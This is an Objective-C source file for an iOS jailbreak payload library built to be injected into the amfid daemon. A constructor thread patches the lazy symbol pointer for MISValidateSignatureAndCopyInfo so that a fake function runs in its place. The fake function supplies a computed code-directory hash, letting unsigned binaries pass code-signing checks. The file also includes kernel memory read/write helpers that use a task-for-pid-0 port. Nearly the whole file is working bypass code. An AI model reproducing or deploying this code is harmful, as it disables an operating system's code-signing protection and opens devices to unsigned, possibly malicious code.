// xcrun -sdk iphoneos gcc -dynamiclib -arch arm64 -framework Foundation -o amfid_payload.dylib amfid_payload.m
// jtool --sign --inplace amfid_payload.dylib

#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <spawn.h>
#include <sys/stat.h>
#include <pthread.h>
#include <xpc/xpc.h>

#import <Foundation/Foundation.h>
#include <CommonCrypto/CommonDigest.h>

kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

kern_return_t mach_vm_write
(
 vm_map_t target_task,
 mach_vm_address_t address,
 vm_offset_t data,
 mach_msg_type_number_t dataCnt
 );

 extern kern_return_t mach_vm_deallocate
(
 vm_map_t target,
 mach_vm_address_t address,
 mach_vm_size_t size
);


kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object_name);


mach_port_t tfpzero = 0;

uint64_t kalloc(vm_size_t size) {
	mach_vm_address_t address = 0;
	mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
	return address;
}



size_t kread(uint64_t where, void *p, size_t size) {
	int rv;
	size_t offset = 0;
	while (offset < size) {
		mach_vm_size_t sz, chunk = 2048;
		if (chunk > size - offset) {
			chunk = size - offset;
		}
		rv = mach_vm_read_overwrite(mach_task_self(), where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
		if (rv || sz == 0) {
			printf("[fun_utils] error on kread(0x%016llx)\n", (offset + where));
			break;
		}
		offset += sz;
	}
	return offset;
}

uint32_t kread32(uint64_t where) {
	uint32_t out;
	kread(where, &out, sizeof(uint32_t));
	return out;
}

uint64_t kread64(uint64_t where) {
	uint64_t out;
	kread(where, &out, sizeof(uint64_t));
	return out;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
	int rv;
	size_t offset = 0;
	while (offset < size) {
		size_t chunk = 2048;
		if (chunk > size - offset) {
			chunk = size - offset;
		}
		rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, chunk);
		if (rv) {
			printf("[fun_utils] error on kwrite(0x%016llx)\n", (offset + where));
			break;
		}
		offset += chunk;
	}
	return offset;
}

void kwrite32(uint64_t where, uint32_t what) {
	uint32_t _what = what;
	kwrite(where, &_what, sizeof(uint32_t));
}


void kwrite64(uint64_t where, uint64_t what) {
	uint64_t _what = what;
	kwrite(where, &_what, sizeof(uint64_t));
}

uint64_t
remote_alloc(mach_port_t task_port,
             uint64_t size)
{
  kern_return_t err;

  mach_vm_offset_t remote_addr = 0;
  mach_vm_size_t remote_size = (mach_vm_size_t)size;
  err = mach_vm_allocate(task_port, &remote_addr, remote_size, 1); // ANYWHERE
  if (err != KERN_SUCCESS){
    NSLog(@"unable to allocate buffer in remote process\n");
    return 0;
  }
  return (uint64_t)remote_addr;
}

void
remote_free(mach_port_t task_port,
            uint64_t base,
            uint64_t size)
{
  kern_return_t err;

  err = mach_vm_deallocate(task_port, (mach_vm_address_t)base, (mach_vm_size_t)size);
  if (err !=  KERN_SUCCESS){
    NSLog(@"unabble to deallocate remote buffer\n");
    return;
  }
  return;
}

uint64_t
alloc_and_fill_remote_buffer(mach_port_t task_port,
                             uint64_t local_address,
                             uint64_t length)
{
  kern_return_t err;

  uint64_t remote_address = remote_alloc(task_port, length);

  err = mach_vm_write(task_port, remote_address, (mach_vm_offset_t)local_address, (mach_msg_type_number_t)length);
  if (err != KERN_SUCCESS){
    NSLog(@"unable to write to remote memory\n");
    return 0;
  }

  return remote_address;
}

void
remote_read_overwrite(mach_port_t task_port,
                      uint64_t remote_address,
                      uint64_t local_address,
                      uint64_t length)
{
  kern_return_t err;

  mach_vm_size_t outsize = 0;
  err = mach_vm_read_overwrite(task_port, (mach_vm_address_t)remote_address, (mach_vm_size_t)length, (mach_vm_address_t)local_address, &outsize);
  if (err != KERN_SUCCESS){
    NSLog(@"remote read failed\n");
    return;
  }

  if (outsize != length){
    NSLog(@"remote read was short (expected %llx, got %llx\n", length, outsize);
    return;
  }
}

void
remote_write(mach_port_t remote_task_port,
             uint64_t remote_address,
             uint64_t local_address,
             uint64_t length)
{
  kern_return_t err = mach_vm_write(remote_task_port,
                                    (mach_vm_address_t)remote_address,
                                    (vm_offset_t)local_address,
                                    (mach_msg_type_number_t)length);
  if (err != KERN_SUCCESS) {
    NSLog(@"remote write failed: %s %x\n", mach_error_string(err), err);
    return;
  }
}

uint64_t binary_load_address() {
  kern_return_t err;
  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
  memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
  mach_vm_size_t target_first_size = 0x1000;
  mach_vm_address_t target_first_addr = 0x0;
  struct vm_region_basic_info_64 region = {0};
  err = mach_vm_region(mach_task_self(), &target_first_addr, &target_first_size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&region, &region_count, &object_name);

  if (err != KERN_SUCCESS) {
    printf("failed to get the region\n");
    return -1;
  }

  return target_first_addr;
}


uint32_t swap_uint32(uint32_t val) {
	val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
	return (val << 16) | (val >> 16);
}

uint8_t *get_sha256(uint8_t* code_dir) {
	uint8_t *out = malloc(CC_SHA256_DIGEST_LENGTH);

	uint32_t* code_dir_int = (uint32_t*)code_dir;

    int cd_off = 0;
    while (code_dir_int[cd_off] != 0) {
        cd_off += 1;
    }
    cd_off += 1;
    int actual_off = swap_uint32(code_dir_int[cd_off]);

    code_dir_int = (uint32_t*)(code_dir+actual_off);
    uint32_t realsize = swap_uint32(code_dir_int[1]);

	// uint32_t realsize = 0;
	// for (int j = 0; j < 1000; j++) {
	// 	if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
	// 		realsize = swap_uint32(code_dir_int[j+1]);
	// 		code_dir += 4*j;
	// 	}
	// }

	CC_SHA256(code_dir_int, realsize, out);

	return out;
}

uint8_t *get_code_directory(const char* name, uint64_t file_off) {
	// Assuming it is a macho

	FILE* fd = fopen(name, "r");

    if (fd == NULL) {
        NSLog(@"Couldn't open file");
        return NULL;
    }

    uint64_t off = file_off;
    fseek(fd, off, SEEK_SET);

	struct mach_header_64 mh;
	fread(&mh, sizeof(struct mach_header_64), 1, fd);

	off += sizeof(struct mach_header_64);
	for (int i = 0; i < mh.ncmds; i++) {
		const struct load_command cmd;
		fseek(fd, off, SEEK_SET);
		fread(&cmd, sizeof(struct load_command), 1, fd);
		if (cmd.cmd == 0x1d) {
			uint32_t off_cs;
			fread(&off_cs, sizeof(uint32_t), 1, fd);
			uint32_t size_cs;
			fread(&size_cs, sizeof(uint32_t), 1, fd);

			uint8_t *cd = malloc(size_cs);
			fseek(fd, off_cs+file_off, SEEK_SET);
			fread(cd, size_cs, 1, fd);
			return cd;
		} else {
			off += cmd.cmdsize;
		}
	}
    NSLog(@"Didnt find the code signature");
	return NULL;
}

int cp(const char *from, const char *to) {
	int fd_to, fd_from;
	char buf[4096];
	ssize_t nread;
	int saved_errno;

	fd_from = open(from, O_RDONLY);
	if (fd_from < 0)
		return -1;

	fd_to = open(to, O_WRONLY | O_CREAT | O_EXCL, 0666);
	if (fd_to < 0)
		goto out_error;

	while (nread = read(fd_from, buf, sizeof buf), nread > 0)
	{
		char *out_ptr = buf;
		ssize_t nwritten;

		do {
			nwritten = write(fd_to, out_ptr, nread);

			if (nwritten >= 0)
			{
				nread -= nwritten;
				out_ptr += nwritten;
			}
			else if (errno != EINTR)
			{
				goto out_error;
			}
		} while (nread > 0);
	}

	if (nread == 0)
	{
		if (close(fd_to) < 0)
		{
			fd_to = -1;
			goto out_error;
		}
		close(fd_from);

		/* Success! */
		return 0;
	}

out_error:
	saved_errno = errno;

	close(fd_from);
	if (fd_to >= 0)
		close(fd_to);

	errno = saved_errno;
	return -1;
}

uint64_t real_func = 0;

typedef int (*t)(NSString* file, NSDictionary* options, NSMutableDictionary** info);

int fake_MISValidateSignatureAndCopyInfo(NSString* file, NSDictionary* options, NSMutableDictionary** info) {
    // NSString *file = (__bridge NSString *)fileStr;
    // NSDictionary *options = (__bridge NSDictionary*)opts;
    NSLog(@"We got called! %@ with %@", file, options);

    t actual_func = (t)real_func;
    actual_func(file, options, info);

    if (![*info objectForKey:@"CdHash"]) {
        NSNumber* file_offset = [options objectForKey:@"UniversalFileOffset"];
        uint64_t file_off = [file_offset unsignedLongLongValue];

        uint8_t* cd_hash = get_sha256(get_code_directory([file UTF8String], file_off));

        *info = [[NSMutableDictionary alloc] init];
        [*info setValue:[[NSData alloc] initWithBytes:cd_hash length:CC_SHA256_DIGEST_LENGTH] forKey:@"CdHash"];
        NSLog(@"ours: %@", *info);
    }

    return 0;
}



void* thd_func(void* arg){
    NSLog(@"In a new thread!");
    NSLog(@"Base at %016llx", binary_load_address());
    if (binary_load_address() == -1) {
        return NULL;
    }

    /* Finding the location of MISValidateSignatureAndCopyInfo from Ian Beer's triple_fetch */
    void* libmis_handle = dlopen("libmis.dylib", RTLD_NOW);
    if (libmis_handle == NULL){
        NSLog(@"Failed to open the dylib!");
        return NULL;
    }

    void* sym = dlsym(libmis_handle, "MISValidateSignatureAndCopyInfo");
    if (sym == NULL){
        NSLog(@"unable to resolve MISValidateSignatureAndCopyInfo\n");
        return NULL;
    }

    uint64_t buf_size = 0x8000;
    uint8_t* buf = malloc(buf_size);

    remote_read_overwrite(mach_task_self(), binary_load_address(), (uint64_t)buf, buf_size);
    uint8_t* found_at = memmem(buf, buf_size, &sym, sizeof(sym));
    if (found_at == NULL){
        NSLog(@"unable to find MISValidateSignatureAndCopyInfo in __la_symbol_ptr\n");
        return NULL;
    }

    uint64_t patch_offset = found_at - buf;

    uint64_t fake_func_addr = &fake_MISValidateSignatureAndCopyInfo;

    real_func = kread64(binary_load_address()+patch_offset);

    // Replace it with our version
    remote_write(mach_task_self(), binary_load_address()+patch_offset, (uint64_t)&fake_func_addr, 8);

    // Test code
    dlopen("/fun_bins/test.dylib", RTLD_NOW);

    // remote_write(mach_task_self(), binary_load_address()+patch_offset, (uint64_t)&old, 8);

    return NULL;
}

__attribute__ ((constructor))
static void ctor(void) {
	NSLog(@"Hi there - creating the thread to do our stuff!");
    pthread_t thd;
    pthread_create(&thd, NULL, thd_func, NULL);
}
